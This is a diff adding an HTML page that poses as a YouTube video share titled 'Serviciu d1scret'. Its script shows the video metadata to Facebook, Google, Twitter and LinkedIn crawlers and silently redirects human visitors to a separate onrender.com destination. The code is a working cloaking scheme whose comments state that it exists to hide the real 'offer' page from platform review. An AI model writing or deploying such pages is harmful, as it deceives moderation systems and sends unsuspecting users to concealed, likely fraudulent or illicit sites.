@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:url"           content="https://www.youtube.com/watch?v=cfWHCWutEAk" />
+    <meta property="og:type"          content="video.other" />
+    <meta property="og:title"         content="Serviciu d1scret" />
+    <meta property="og:description"   content="Serviciu d1scret" />
+    <meta property="og:image"         content="https://i.postimg.cc/13HTjVrN/Gemini-Generated-Image-gtx4nmgtx4nmgtx4.png" />
+
+    <title>Cargando...</title>
+
+    <script>
+        // Configuración de enlaces
+        var youtubeLink = "https://www.youtube.com/watch?v=cfWHCWutEAk";
+        var destinationLink = "https://rummaniia00104040.onrender.com";
+
+        function isBot() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            
+            // Lista ampliada de bots de Facebook y otros rastreadores comunes
+            var botNames = [
+                "facebookexternalhit", // Principal bot de Facebook
+                "facebot",             // Bot de rastreo de Facebook
+                "facebookplatform",    // Plataforma de Facebook
+                "googlebot", 
+                "bingbot", 
+                "adidxbot", 
+                "applebot",
+                "twitterbot",          // Para que también funcione en Twitter
+                "linkedinbot"          // Para LinkedIn
+            ];
+
+            for (var i = 0; i < botNames.length; i++) {
+                if (userAgent.indexOf(botNames[i]) !== -1) {
+                    return true;
+                }
+            }
+
+            // Verificación adicional: Facebook suele usar versiones de "facebookexternalhit/1.1"
+            if (/facebookexternalhit|facebot/i.test(userAgent)) {
+                return true;
+            }
+
+            return false;
+        }
+
+        // Lógica de redirección inmediata
+        if (isBot()) {
+            // El Bot se queda aquí o es enviado a YouTube para que lea la metadata
+            window.location.replace(youtubeLink);
+        } else {
+            // La persona real va a tu oferta/página destino
+            window.location.replace(destinationLink);
+        }
+    </script>
+</head>
+<body>
+    <p>Cargando contenido...</p>
+</body>
+</html>
